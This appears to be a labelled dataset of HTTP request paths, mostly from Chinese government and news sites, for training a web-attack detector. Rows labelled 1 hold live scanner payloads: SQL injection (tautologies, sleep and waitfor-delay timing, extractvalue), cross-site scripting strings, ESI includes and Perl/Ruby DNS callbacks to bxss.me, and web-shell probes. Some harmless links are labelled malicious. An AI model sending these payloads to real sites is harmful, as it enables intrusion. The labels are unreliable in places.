request	label
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u76db\u6e90\u79cd\u690d\u4e13\u4e1a\u5408\u4f5c\u793e	0
/***/interface/comul_total.json.jsp?callback=jquery19103915096425784488_1640034887832	0
/***/viewspace-6.html	0
/**********/system/2021/08/14/013434737.shtml	0
/******/system/2021/08/02/013428900.shtml	0
/****/system/2006/08/22/000001133.shtml	0
/*****/system/2021/12/17/013496076.shtml	0
/****/20210106/e113806812.html	0
/****/xqdt/hnx/201610/t20161025_50907.html	0
/**********/system/2021/12/14/javascript:window.close();	1
/**********/system/2021/10/24/013469163.shtml	0
/****/gccb/jcgc%' and 2*3*8=6*8 and 'usup'!='usup%/	1
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u946b\u76db\u6e90\u679c\u852c\u4ea7\u9500\u4e13\u4e1a\u5408\u4f5c\u793e	0
"/****/gfxwj/202012/"">\u81ea\u6cbb\u533a\u7164\u70ad\u5730\u8d28\u5c40</a>"	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5f69\u5747\u94dd\u5408\u91d1\u7ecf\u9500\u90e8	0
/***/0/00/03/07/30711_353223.gif	0
/******/system/2010/09/06/010192938.shtml	0
/****/bmkx/snmj/202001/t20200115_146519.html	0
/**/aboutus/messagefromchairman/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/bmkx/sjsj/201910/t20191012_143027.html	0
/****/system/2021/11/21/013483283.shtml	0
/****/zzxxgk/bmsthjj/xxgkml/hjxx/hjwfbgt/202101/t20210108_176022.html	0
/*******/qiye/pvfgp3_45_e143346353.html	0
/**********/system/2021/08/27/013440663.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u6c5f\u6c5f\u5546\u884c	0
/****/bmkx/szjrmfy/202104/t20210407_179361.html	0
/****/bxss.me/202012/t20201225_2539623.html	1
/****/czgk/bmjs/zzqjcyxt/jyxrmjcy/201805/t20180524_765573.html	0
/wp-content/******/enfold/archive.php	1
/**********/system/2021/08/05/013430990.shtml	0
/****/xxxsd/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/czgk/bmjs/rmtt/fl/202008/t20200818_2189937.html	0
/****/zjdt/czjs/gzdt/command/cmd	1
/****/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1)	1
/***/cms/frontpage.do?title=\u6fb3\u95e8&view=staticfile/searchpath/hotlabel	0
/****/system/2021/12/18/javascript:void(0);	1
"/****/czgk/bmjs/zzqfyxt/ycxzjrmfy/202108/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5e7f\u4e1c\u529e\u4e8b\u5904</a>"	0
/****/qzfwj/?id=5633	0
"/***/advert?data={""ad_type"":5,""channel_type"":4,""channel_id"":12500,""place_id"":""fm_sp_ard"",""news_id"":""1169343""}"	0
/***/003/004/508/00300450891_0b4c3aaa.jpg	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u5f55\u7965\u517b\u6b96\u5bb6\u5ead\u519c\u573a	0
/**********/system/2021/11/20/javascript:void(0);	1
/****/system/2016/03/22/011961260.shtml	0
/wp-content/******/seowp/all-icons-page.php	1
/******/public/2020/11/10/20201110_175b16d6064_r1_1200k.mp4	0
/*******/qiye/b-e849909.html	0
/****/zzxxgk/jjhzj/zsxm/whly/	0
"/****/web/search?perpage=*/-->'""""></iframe></script></style></title></textarea><script >alert(51550)</script>"	1
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqzrzyt/	0
/enjoymobilexcx_mt/****/downloadimage/?id=cea601f2-ad3c-490d-9a90-d560ac63f961	0
/**/system/2021/12/21/012232192.shtml	0
/****/1012/1070.htm	0
"/*****/gywm/flgw/""""><script>alert(215)</script>"	1
/**/system/2021/01/21/javascript:void(0);	1
/**********/system/2020/05/25/013169979.shtml	0
/**********/system/2021/12/20/013497373.shtml	0
/****/2020jnxc/zyjh/index_2.html	0
/************/template/jcse/110105008056111/bxss.me/images/hanweb.css	1
/******/system/2011/02/16/010289464.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5927\u6d0b\u6c7d\u8f66\u4fee\u7406\u90e8	0
/****/zzxxgk/bmsthjj/xxgkml/czzj/201612/t20161226_138398.html	0
/**********/0'xor(if(now()=sysdate(),sleep(6),0))xor'z-01-12.html	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a(\u5357)\u56de\u6625\u6c49\u9910	0
/****************/notification/negotiate?access_token=55c16732-e8aa-4c10-9b03-c6220a283e6f	0
/****/system/2015/08/05/011783757.shtml	0
/**/system/count/0006017/000000000000/window.location.href	1
/***/xm/menu/images/yingfu.gif	0
/****/nxqlzhkjzt/	1
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/202107/w020210704608409865552.jpg	0
/****/czgk/bmyjs/qtdw/zzqzfgjjglb/201903/t20190301_1295977.html	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u9999\u5473\u602a\u9999\u9165\u9e21\u9e2d\u5e97	0
/****/zzxxgk/tjj/zfxxgkml_2127/hygq_2064/list'||'.html	1
"/******/jslib/ckplayer/ckplayer.js/""""><script>alert(6545)</script>?_=1630312392672"	1
/****/web/search?perpage=20' waitfor delay '0:0:2&outlinepage=10&keyword=1&channelid=240998&searchword=1&page=10	1
/**********/system/2021/08/06/013431123.shtml	0
/****/bmkx/sgaj/201812/t20181208_'.gethostbyname(lc('hitis'.'inaqwueoff407.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(102).chr(75).chr(118).chr(74).'.html	1
"/**/photostore/workbox.php?mode=addtolightbox&mediaid=""""><script>alert(777)</script>"	1
/**/index.php?do=post&id=319&c=dt&a=goods&	1
/***********/zaojianpinglun/?_=1639980345725	0
/**********/system/2020/04/25/013148607.shtml	0
/******/resource%' and 2*3*8=6*8 and '0otc'!='0otc%/js/newcalendar/calendar.js	1
"/****/category/sichouzhiluwenda?page=1'""()&%<acu><script>9112(9131)</script>"	1
/******/usercenter/index?qrcode=7076&code=061k7ega1hgvkc0zp2ha1x7bql3k7egf	0
/******/static/js/core/window.location.href,title:document.title,container:s.selector,fragment:e.fragment,timeout:e.timeout},window.history.replacestate(a.state,document.title));var	1
"/****/zzxxgk/tjj/zfxxgkml_2127/hygq_2064/' 'a'.concat(70-3).concat(22*4).concat(113).concat(70).concat(108).concat(66) (require'socket'
socket.gethostbyname('hitwq' 'lukcegju52374.bxss.me.')[3].to_s) '.html"	1
/*******/2nl18r.php	1
/****/xxgkml/qtfdxx/zdjcyjzj/201909/t20190930_142753.html	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u6052\u6e90\u8fbe\u901f\u9012\u8d27\u8fd0\u670d\u52a1\u4e2d\u5fc3	0
/****/zgsdt/2014zgsdt/201412/t20141218_40934.html	0
/****/czgk/bmjs/qtdw/zzqhtglzx/index_1.html	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u4e30\u767b\u4e61\u5efa\u6750\u5382	0
/zwxx_11337/****/202002/t20200224_1967458.html	0
/**********/system/2021/12/19/013496623.shtml	0
/****/wdsjs/hfswsj/201903/t20190320_115351_wap.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5b81\u4e1c\u9999\u98d8\u6d77\u5ce1\u706b\u9505\u57ce	0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15' or 6637=6637 and '1'='1&outlinepage=10	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtpra4k/ubtubf322c8i1uji=&openid=ovl7jjqkwe4o7ip8k7_xbzgkt8xy&outer_str=28106&activate_ticket=fdzv9emqaffrnr3xboqhb2inarrehu3u7cpdtamsvlpoo8dbj5 fzedtzplsmcardqc7in/s/mcolc3wz9ny8ruixnjn55/iaeksfcha1wk=	0
/******/usercenter/index?qrcode=quicklyrq,3,117544,295529	0
"/**/images/idangerous.swiper.css/*/-->'""""></iframe></script></style></title></textarea><script >alert(28137)</script>"	1
/**********/system/more/217000000000000/0046/217000000000000_00004681.shtml	0
/****/lczivo-syxw-e111215832.html	0
"/****/qzfwj/202006/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5e7f\u4e1c\u529e\u4e8b\u5904</a>"	0
/****/jtdt/jt16/201611/t20161125_106197.html	0
/****/system/2012/03/23/javascript:dozoom(9)	1
/****/czgk/bmjs/zzqjcyxt/hyxrmjcy/201805/t20180524_765591.html	0
/************/template/jcse/http://bxss.me/t/fit.txt/16/images/style.css	1
/**********/system/2013/10/21/011213243_02.shtml	1
/****/qzfwj/201801/t20180115_668900.html	0
/****/bmkx/swjw/202112/w020211204455661732112.jpg	0
/**/includes-css-modules.php	1
/****/czgk/bmjs/zzqfyxt/jfqrmfy/202108/t20210818_2979417.html	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(4980)"">?_=1630312232645"	1
/**/mediacenter/news/202006/t20200616_249035.html	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u90b5\u521a\u9547\u751f\u5fe0\u7ecf\u7eaa\u884c	0
/*******/6o3qly.php	1
"/******/457/phone.js/""><script>alert(7522)</script>"	1
/****/b-e416919.html	0
"/******/'""""()&%<acx><script >gejm(9387)</script>/grouppic/jquery.ad-gallery.js"	1
/**********/system/2021/11/02/013473647.shtml	0
"/****/telaen/index.php?tid=default&lid=en_uk&f_email="""">alert(777)"	1
/****/wdsjs/hfswsj/202012/t20201204_174644.html	0
/****/xh/hd/202004/t20200407_2013625.html	0
/****/wp-admin/admin-post.php?page=fancybox-for-wordpress	1
/**********/system/2020/12/15/013302671.shtml	0
/****/xydt/2016hydt/201606/t20160612_87979.html	0
/zwxx_11337/****/zcjd/201907/*	0
"/****/"""".gethostbyname(lc(""""hitgl"""".""""dqpwcwph4428a.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(113).chr(80).chr(110).chr(83).""""/sgaj/201812/t20181208_112298.html"	1
/**********/system/2021/11/18/javascript:window.print()	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtpmknf /w0otfig9u0f i3o=&openid=ovl7jjukqojzsbmgmpsjbiuildby&outer_str=4186&activate_ticket=fdzv9emqaffrnr3xboqhb/cpljk6dqwfpnyfqxvbulxoo8dbj5 fzedtzplsmcarv6yy5bgckk1qtpp537cbi2z3hwulbkrq7hdziu9ejim=	0
/**********/system/2021/12/19/013496652.shtml	0
"/***/index.php?c=user&a="";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink();""//"	1
/******/visitcount/visit.jsp?i_columnid[0]=exp'and/**/extractvalue(1,concat(char(126),md5(1105662730)))and'&i_columnid[1]==1&i_webid=1&type=1	1
/***/getlist?vno=3.5.0°¡tamp=1640008985858&	0
/****/img3/2.jpg	0
"/******/web_front.js/<img src=""javascript:alert(508)"">"	1
/******/system/2021/11/06/013476494.shtml	0
/****/xqldly/hfbysj/201907/t20190729_140308.html	0
/******/icon13.png	0
/****/web/search?page=2&channelid=-1) or 3552=8536#&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10	1
/****/20211202/10832.html	0
/investors-garden/******/intermediary/2020-07-15/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.html	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u571f\u755c\u4ea7\u603b\u516c\u53f8\u4eac\u94f6\u5b9d\u77f3\u52a0\u5de5\u5382	0
/*****/system/2021/08/03/013429820.shtml	0
/about-southwest/information-disclosure/*/	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u6b63\u9686\u65e7\u8d27\u4ea4\u6613\u4e2d\u5fc3	0
"/************/template/"""" """"a"""".concat(70-3).concat(22*4).concat(114).concat(69).concat(97).concat(73) (require""""socket""""
socket.gethostbyname(""""hithn"""" """"iwcyplpfd267b.bxss.me."""")[3].to_s) """"/110105008056111/16/images/jquery.waterfall.js"	1
/****/system/2020/07/03/javascript:void();	1
/**********/system/2020/06/09/013181652.shtml	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u5bcc\u5174\u5357\u8857\u51e1\u515c\u7ae5\u88c5\u5e97	0
/***/0/00/59/50/595051_356657.jpg	1
/**/system/count/0006011/000000000000/window.location.href	1
/wp-content/*******/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642';alert(777)//645	1
/****/system/2021/01/15/javascript:window.close();	1
/****/dzzb/images/p020141127380174605234.jpg	0
/zwxx_11337/****/201904/w020190422533746683388.jpg	0
/******/ew/20161024140410146.jpg	0
/***********/rdandmanufacture/	0
"/****/bysrd/201610/t20161016_531.html?leader=—¶œ„¡·<esi:include src=""""http://bxss.me/rpb.png""""/>"	1
/******/resource/code/datainput.jsp?owner=1329914701&e=1&w=1920&h=1080&treeid=1124&refer=ahr0cdovl3d3dy5uegpzy3guy29tlmnul3h6enguahrt&pagename=l2xpc3quannw&newsid=-1	0
/***/0/00/52/05/520561_619492.jpg	0
/***/0/01/90/38/1903849_991513.jpg	0
/**********/system/2021/12/07/013491310.shtml	0
"/' 'a'.concat(70-3).concat(22*4).concat(108).concat(86).concat(120).concat(77) (require'socket'
socket.gethostbyname('hitqx' 'wcagrvvk4d467.bxss.me.')[3].to_s) '/****/7/12/art_35_234319.html"	1
/****/system/2021/12/20/javascript:dozoom(14)	1
/******/public/2018/01/16/86476.images/v86476_b1516065577225_app.jpg	0
/***/mobile_h5/waparticledetail.do?article_id=202101282332571214&contenttype=article	1
/*******/qiye/businesses-e35704.html?category_id=242994	0
/****/ad_js.php?aid=14&c=assert	1
"/****/xxgkml/' 'a'.concat(70-3).concat(22*4).concat(119).concat(70).concat(104).concat(81) (require'socket'
socket.gethostbyname('hitfb' 'phhcgwhe60eea.bxss.me.')[3].to_s) '/list.html"	1
/***/003/004/219/00300421911_5f106adf.jpg	0
/****/system/2017/04/07/javascript:dozoom(12)	1
"/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqswt/201808/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5317\u4eac\u529e\u4e8b\u5904</a>"	0
"/****/mydevice/loggedout.jsp?locale=""""><script>alert(777)</script>"	1
/****/xxgkml/qtfdxx/zcjd/qwjd/201611/w020161113024032674880.jpg	0
/****/yqzt/qyddt/202002/t20200214_242874.html	0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u5144\u5f1f\u6c7d\u8f66\u7ef4\u4fee\u5e97	0
/****/bmkx/sgsj/202101/w020210120619879042222.jpg	0
/****/zxxx/content.html?metadataid=10126210	0
/**********/toutiao/	0
/zwxx_11337/****/202012/t20201229_2542543.html	0
"/****/main/admin/session_edit.php?page=resume_session.php"" onmouseover=confirm(777)//&id=1"	1
/******/web/jpage/theme/simple'||'/css/jpage.css	1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u767d\u4f0f\u594e\u767e\u8d27\u5546\u5e97	0
/****/system/2021/12/17/javascript:window.close();	1
/zwgk' and 2*3*8=6*8 and 'wppg'='wppg/****/bmjs/gdyx/	1
/****/zgsdt/2015_zgsdt/201512/t20151231_80252.html	0
/*/public/viewclick/?addclick=1&classid=105&id=-1; waitfor delay '0:0:8.654' --	1
/***/open?signature=a1b8a560ebaf97ccf6c872619a0c2b8196850203°¡tamp=1640016264&nonce=1063341807&encrypt_type=aes&msg_signature=42eb029f27bc329b6d94d184b1cf82a6094c3f93	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u7acb\u5c97\u9547\u5c11\u96c4\u5efa\u6750\u7ecf\u9500\u90e8	0
/***/0/01/84/90/1849057_926008.jpg	0
/******/n42746/c1723818/content'||'.html	1
/****/web/search?channelid=222832&searchword=\u9686\u5fb7\u53bf\u6d69\u6d69\u68cb\u724c\u5ba4	0
/***/col42/index.html	0
/****/zfxxgk/fdzdgknr/sfxm/jyfwxsfml	0
/****/20200919/e107052508.html	0
/***/0/01/07/84/1078438_072080.jpg	0
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u7ea2\u5b9d\u9020\u578b\u7406\u53d1\u5e97	0
/**********/system/2021/09/24/013456216.shtml	0
/****/czgk/bmyjs/zzqdwgzbmyxsjg/zzqdwbgt/202002/p020200210598079449699.pdf	0
"/****/zfwjn/1088/1095/list.html?new=' 'a'.concat(70-3).concat(22*4).concat(103).concat(70).concat(121).concat(83) (require'socket'
socket.gethostbyname('hitca' 'swkfznrk4f6d6.bxss.me.')[3].to_s) '"	1
/*****/gy48/cpgyss.asp?key=pp\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/******/system/2021/11/27/javascript:void();	1
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419%') or 1043=1043 and '%'='	1
/zwxx_11337/****/201905/t20190509_1471243.html	0
/*****/system/2019/09/20/javascript:void(0);	1
/****/bmfw/202010/w020201026397639748485.png	0
/*****/system/2021/04/04/javascript:void();	1
"/**/ui/widgets/hanweb<esi:include src=""""http://bxss.me/rpb.png""""/>/ie6fixed/ie6fixed.js"	1
/****/byyw/index_41.html	0
/****/zzxxgk/czj/zfxxgkml_2139/czyjsxx/202105/t20210511_182425_wap.html	0
/***/com/menu/images/m1-2.jpg	0
/*****/system/2021/08/20/javascript:window.close();	1
/zwxx_11337/****/zzlist_3.html	0
/********/24xiaoshi/	0
"/****/cgi-bin/module/sharedobjmanager/policy_new/874/policytable?vdom=""'/></script><script>alert(777)</script>"	1
/****/gggs/201709/t20170912_94796_wap.html	0
/**********/system/2021/11/10/013478116.shtml	0
/****/system/2016/05/18/012007388.shtml	0
"/****/cat1.php?id2=0&pricestart=0&room=&flache=&price=&zulassung=&kilometer=&kraftstoff=&id3=0&suche=""><script>alert(777);</script>&id=0&suchewo=&umkreis=0"	1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u4e0b\u9a6c\u5173\u9547\u6c38\u4fca\u7a46\u65af\u6797\u7528\u54c1\u5e97	0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448%') and 8506=3217	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u5929\u987a\u6469\u6258\u8f66\u914d\u4ef6\u9500\u552e\u90e8	0
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u84dd\u9b45\u5a31\u4e50\u4f11\u95f2\u4f1a\u6240	0
/**********/system/2021/11/09/013477666.shtml	0
/****/0703/784400.shtml	0
/************/template/jcse/110105008056111/16/images'||'/plugin/criteria/css.css	1
/******/usercenter/index?qrcode=6366	0
/**********/system/2020/04/25/013148609.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u9ad8\u5c71\u5bfa\u845b\u8f89\u7ea2\u67a3\u7ecf\u9500\u90e8	0
/**********/system/2021/07/05/javascript:void(0);	1
/****/\ufffd\ufffd\u04b5	0
"/zwxx_11337/*******/202109/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5317\u4eac\u529e\u4e8b\u5904</a>"	0
/****/xqldly/hfhnxz/202110/t20211007_195083.html	0
/****/gjmt/zgsmt/index_4.html	0
/***/interface/comul_total.json.jsp?callback=jquery191049439450065261314_1640016367177	0
/****************/file/loadimage/?id=f61488d7-dfbf-422a-87cf-e13c0fa77287	0
"/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqscjgt/zzqgsj/\""javascript:void(0)\"""	1
/****/xxgkml/qtfdxx/zdjcyjzj/202006/t20200629_168475.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5ba3\u548c\u4f9b\u9500\u793e\u8349\u53f0\u7efc\u5408\u670d\u52a1\u7ad9	0
/**********/system/2021/12/11/013492882.shtml	0
/****/czgk/bmyjs/rmtt/fl/index_1.html	0
"/****/qzfwj/202109/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u798f\u5efa\u529e\u4e8b\u5904</a>"	0
/************/interfaces/dimension.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=&q=«Î ‰»Îπÿº¸¥ &searchid=1&tpl=16&websiteid=if(now()=sysdate(),sleep(15),0)	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u4e50\u4eab\u53a8\u536b\u7535\u5668\u7ecf\u9500\u90e8	0
"/****/rdjy/202012/t20201225_2539623'""""()&%<acx><script >cfsb(9973)</script>.html"	1
/****/zzxxgk/bmsthjj/xxgkml/hjxx/hjwfbgt/202105/t20210520_182814.html	0
/*********/index.php	0
/****/qzfwj/201905/t20190529_1526366.html	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u91d1\u878d	0
/****************/notification/negotiate?access_token=6921a31c-e2e0-48b5-a485-83060ecadfa1	0
/*******/gvideos.php?gid=1 and 1=2	1
/****/system/2021/12/06/javascript:window.close();	1
/***/0/00/25/29/252975_176701.jpg	0
/****/czgk/bmyjs/zzqdwgzbmyxsjg/zzqdwxsb/	0
/****/user/gallery1.php?g_name=<script>alert(77729</script>	1
/**********/system/2020/07/10/013203252.shtml	0
/**********/system/2021/12/17/013495998.shtml	0
"/****/rdjy/202012/t20201225_2539623<esi:include src=""""http://bxss.me/rpb.png""""/>.html"	1
/*******/qiye/b-e1847339.html	0
/****/system/2021/12/17/javascript:window.print()	1
/*****/20190522/javascript:void(0);	1
/****/wdsjs/hfswsj/zmhdyc'||'.html	1
/****/admin.php?cont=store_nas	1
/****/web/search?page=2&channelid=253477&searchword=1') and 7989=0840 and '1'='1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u51ef\u5fc3\u751f\u6d3b\u8d85\u5e02	0
/**********/system/2021/05/12/013383920.shtml	0
"/xxgk'""""()&%<acx><script >gva8(9864)</script>/*****/1088/1105/list.html"	1
/**********/index_50.html	0
/****/web/search?page=13&channelid=222832&searchword=\u5218\u53ef\u4e3a&keyword=\u5218\u53ef\u4e3a&perpage=20&outlinepage=10	0
/***/0/00/84/70/847050_341420.jpg	0
/****/jsly/gcdzyqzysjx/201501/t20150129_52362.html' and 'x'='y	1
/****************/notification/negotiate?access_token=3017ab70-3d52-4360-bc9f-1675d18edd8a	0
/****/bmkx/ssjj/index_10.html	0
"/****/zfwjn/1088/1105/list.html?new=0.4577770013510203<esi:include src=""""http://bxss.me/rpb.png""""/>"	1
/****/bmkx/jtysj/202011/t20201125_174296.html	0
"/************/template/jcse"""" and 2*3*8=6*8 and """"u9rw""""=""""u9rw/110105008056111/16/images/hanweb.css"	1
/****/20180525/javascript:void(0);	1
/******/resource/js/filedownload/createimage.jsp?randnum=1639980632185	0
/*****/ywly/myyfw/gygj/dszzc/qywh/shzr/bqsm/xwzx/gjmt/zgsmt/	0
/****/sj1/jjzs/202007/t20200727_2173427.html	0
/******/swqh/yc.html	0
